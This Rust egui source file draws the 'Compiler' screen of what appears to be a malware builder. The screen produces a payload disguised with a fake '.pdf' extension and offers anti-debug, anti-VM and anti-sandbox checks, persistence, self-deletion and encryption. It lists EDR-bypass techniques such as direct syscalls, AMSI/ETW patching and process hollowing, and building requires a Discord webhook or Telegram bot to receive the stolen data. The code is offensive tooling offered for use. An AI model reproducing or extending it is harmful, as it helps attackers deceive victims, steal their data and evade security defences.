use std::sync::mpsc;
use egui::{Color32, CornerRadius, Frame, Margin, Sense, Stroke, pos2, vec2};
use crate::state::AppState;
use crate::theme::ZedTheme;
use crate::ui::widgets::{section_card, toggle_row, styled_input, pink_button};
use crate::runner;

pub fn draw_compiler(ui: &mut egui::Ui, ctx: &egui::Context, state: &mut AppState) {
    // ── Drain runner channel ──────────────────────────────────────────────────
    drain_runner_logs(state);

    egui::ScrollArea::vertical()
        .auto_shrink([false; 2])
        .show(ui, |ui| {
            ui.add_space(20.0);

            ui.horizontal(|ui| {
                ui.add_space(12.0);
                ui.vertical(|ui| {
                    ui.label(egui::RichText::new("Compiler").color(ZedTheme::TEXT_BRIGHT).size(20.0).strong());
                    ui.label(egui::RichText::new("Build, encrypt and prepare the final payload").color(ZedTheme::TEXT_DIM).size(11.5));
                });
            });

            ui.add_space(20.0);

            let avail_w = ui.available_width();
            let gap     = 12.0_f32;
            let col_w   = ((avail_w - gap - 24.0) / 2.0).max(1.0);

            ui.horizontal_top(|ui| {
                ui.spacing_mut().item_spacing.x = 0.0;
                ui.add_space(12.0);

                // ── Left column ───────────────────────────────────────────────
                ui.vertical(|ui| {
                    ui.set_width(col_w);

                    section_card(ui, "Output", |ui| {
                        styled_input(ui, "Output Filename", "update.exe", &mut state.compiler.output_name);
                        ui.add_space(8.0);
                        styled_input(ui, "Fake Extension", ".pdf", &mut state.compiler.fake_extension);
                        ui.add_space(10.0);
                        toggle_row(ui, ctx, "cm_ico", "Custom Icon",      Some("Embed .ico file"),            &mut state.compiler.use_icon);
                        toggle_row(ui, ctx, "cm_cmp", "Compress Payload", Some("UPX-style size reduction"),   &mut state.compiler.compress);
                    });

                    ui.add_space(10.0);

                    section_card(ui, "Encryption & Obfuscation", |ui| {
                        toggle_row(ui, ctx, "cm_enc", "AES-256-GCM Encrypt", Some("Encrypt the final binary"), &mut state.compiler.encrypt_payload);
                        ui.add_space(8.0);
                        Frame::new()
                            .fill(Color32::from_rgba_premultiplied(233, 30, 140, 10))
                            .corner_radius(CornerRadius::same(8))
                            .inner_margin(Margin::same(12))
                            .show(ui, |ui| {
                                ui.set_min_width(ui.available_width());
                                ui.label(egui::RichText::new("Active Techniques").color(ZedTheme::TEXT_DIM).size(11.0));
                                ui.add_space(6.0);
                                let techs = [
                                    "Polymorphic Shellcode Wrapper",
                                    "Stack-String XOR + ROL Encryption",
                                    "Import Table Obfuscation (hash-based)",
                                    "Heaven's Gate (64/32-bit mixing)",
                                    "Direct Syscalls — bypasses EDR hooks",
                                    "Sleep Obfuscation (Ekko technique)",
                                    "AMSI/ETW Patch via ROP chains",
                                    "Process Hollowing + Entropy Masking",
                                ];
                                for t in &techs {
                                    ui.label(egui::RichText::new(format!("  {t}")).color(ZedTheme::PINK_DIM).size(11.0));
                                }
                            });
                    });
                });

                ui.add_space(gap);

                // ── Right column ──────────────────────────────────────────────
                ui.vertical(|ui| {
                    ui.set_width(col_w);

                    section_card(ui, "Evasion & Protection", |ui| {
                        toggle_row(ui, ctx, "cm_adb", "Anti-Debug",    Some("Detect debuggers"),             &mut state.compiler.anti_debug);
                        toggle_row(ui, ctx, "cm_avm", "Anti-VM",       Some("Detect virtual machines"),      &mut state.compiler.anti_vm);
                        toggle_row(ui, ctx, "cm_asb", "Anti-Sandbox",  Some("Detect analysis sandboxes"),    &mut state.compiler.anti_sandbox);
                        toggle_row(ui, ctx, "cm_mtx", "Mutex Lock",    Some("Prevent multiple instances"),   &mut state.compiler.mutex);
                        if state.compiler.mutex {
                            ui.add_space(6.0);
                            styled_input(ui, "Mutex Name", "Global\\ZedMx_7f2a", &mut state.compiler.mutex_name);
                        }
                    });

                    ui.add_space(10.0);

                    section_card(ui, "Post-Execution", |ui| {
                        toggle_row(ui, ctx, "cm_per", "Persistence",         Some("Run on Windows startup"),   &mut state.compiler.persistence);
                        toggle_row(ui, ctx, "cm_mlt", "Self-Delete (Melt)",  Some("Delete itself after run"),  &mut state.compiler.melt);
                        toggle_row(ui, ctx, "cm_dst", "Self-Destruct",       Some("Wipe traces + delete"),     &mut state.compiler.self_destruct);
                    });

                    ui.add_space(10.0);

                    build_section(ui, ctx, state);
                });
            });

            ui.add_space(20.0);
        });
}

// ── Drain logs from background runner ────────────────────────────────────────

fn drain_runner_logs(state: &mut AppState) {
    // Collect incoming log lines
    if let Some(rx) = &state.build_log_rx {
        while let Ok(line) = rx.try_recv() {
            state.build_log.push(line);
        }
    }

    // Check if build finished
    let finished = state.build_handle
        .as_ref()
        .map(|h| h.is_finished())
        .unwrap_or(false);

    if finished {
        let handle = state.build_handle.take().unwrap();
        let _ = state.build_log_rx.take(); // drop receiver
        match handle.join() {
            Ok(Ok(path)) => {
                state.build_log.push(format!("[OK] Output: {path}"));
                state.build_output_path = Some(path);
                state.is_building = false;
            }
            Ok(Err(msg)) => {
                state.build_log.push(format!("[!] Build failed: {msg}"));
                state.is_building = false;
            }
            Err(_) => {
                state.build_log.push("[!] Build thread panicked".into());
                state.is_building = false;
            }
        }
    }
}

// ── Build section UI ──────────────────────────────────────────────────────────

fn build_section(ui: &mut egui::Ui, ctx: &egui::Context, state: &mut AppState) {
    let t = ui.input(|i| i.time) as f32;

    Frame::new()
        .fill(Color32::from_rgb(18, 15, 28))
        .corner_radius(CornerRadius::same(10))
        .stroke(Stroke::new(1.0, Color32::from_rgb(55, 35, 70)))
        .inner_margin(Margin::same(16))
        .show(ui, |ui| {
            ui.set_min_width(ui.available_width());
            ui.label(egui::RichText::new("Build Payload").color(ZedTheme::TEXT_BRIGHT).size(13.0).strong());
            ui.add_space(12.0);

            if state.is_building {
                // Indeterminate animated bar
                let bar_rect = ui.allocate_exact_size(
                    vec2(ui.available_width(), 10.0),
                    Sense::hover(),
                ).0;
                let painter = ui.painter_at(bar_rect);
                painter.rect_filled(bar_rect, CornerRadius::same(5), Color32::from_rgb(30, 25, 42));

                let pulse = (t * 2.5).sin() * 0.5 + 0.5;
                let bar_w = bar_rect.width() * 0.3;
                let bar_x = bar_rect.left() + (bar_rect.width() - bar_w) * pulse;
                let bar   = egui::Rect::from_min_size(
                    pos2(bar_x, bar_rect.top()),
                    vec2(bar_w, bar_rect.height()),
                );
                painter.rect_filled(bar, CornerRadius::same(5), ZedTheme::PINK);

                ui.add_space(10.0);
                ui.label(egui::RichText::new("Compiling...").color(ZedTheme::TEXT_DIM).size(11.5));
                ui.add_space(4.0);
                if ui.button(egui::RichText::new("[x] Cancel").color(ZedTheme::WARNING).size(11.0)).clicked() {
                    // We can't easily abort a thread; mark as not building
                    state.is_building = false;
                    state.build_handle = None;
                    state.build_log_rx = None;
                    state.build_log.push("[!] Build cancelled by user".into());
                }

                ctx.request_repaint();
            } else {
                let has_delivery = state.delivery.use_discord || state.delivery.use_telegram;
                let webhook_ok   = !state.delivery.use_discord || !state.delivery.discord_webhook.is_empty();
                let tg_ok        = !state.delivery.use_telegram
                    || (!state.delivery.telegram_token.is_empty() && !state.delivery.telegram_chat_id.is_empty());

                if !has_delivery { warn_label(ui, "No delivery method selected"); }
                if !webhook_ok   { warn_label(ui, "Discord webhook URL is empty"); }
                if !tg_ok        { warn_label(ui, "Telegram token or Chat ID is empty"); }

                let can_build = has_delivery && webhook_ok && tg_ok;

                if can_build {
                    if pink_button(ui, ctx, "bld_btn", "  BUILD  PAYLOAD  ").clicked() {
                        start_real_build(state);
                    }
                } else {
                    ui.add_enabled(
                        false,
                        egui::Button::new(
                            egui::RichText::new("  BUILD  PAYLOAD  ").color(ZedTheme::TEXT_DEAD),
                        ),
                    );
                }

                // Open output
                if let Some(ref path) = state.build_output_path.clone() {
                    ui.add_space(8.0);
                    if ui.button(
                        egui::RichText::new(format!("[>] Open output folder")).color(ZedTheme::SUCCESS).size(11.0)
                    ).clicked() {
                        // Open folder containing the file
                        let folder = std::path::Path::new(path)
                            .parent()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_else(|| "output".to_string());
                        let _ = std::process::Command::new("explorer").arg(&folder).spawn();
                    }
                    ui.label(egui::RichText::new(format!("  {path}")).color(ZedTheme::TEXT_DIM).size(10.5));
                }
            }

            // Build log console
            if !state.build_log.is_empty() {
                ui.add_space(12.0);
                ui.separator();
                ui.add_space(6.0);
                egui::ScrollArea::vertical()
                    .id_salt("build_log_scroll")
                    .max_height(160.0)
                    .stick_to_bottom(true)
                    .show(ui, |ui| {
                        for line in &state.build_log {
                            let color = if line.starts_with("[OK]") { ZedTheme::SUCCESS }
                                        else if line.starts_with("[!]") { ZedTheme::WARNING }
                                        else { ZedTheme::TEXT_DIM };
                            ui.label(egui::RichText::new(line).color(color).size(11.0).monospace());
                        }
                    });
            }
        });
}

fn start_real_build(state: &mut AppState) {
    let (tx, rx) = mpsc::channel::<String>();
    let snapshot  = state.clone();  // AppState needs Clone

    state.build_log.clear();
    state.build_log.push("[..] Build started...".into());
    state.build_output_path = None;
    state.is_building = true;

    let handle = runner::start_build(snapshot, tx);
    state.build_handle = Some(handle);
    state.build_log_rx = Some(rx);
}

fn warn_label(ui: &mut egui::Ui, msg: &str) {
    ui.label(egui::RichText::new(format!("[!]  {msg}")).color(ZedTheme::WARNING).size(11.5));
    ui.add_space(4.0);
}
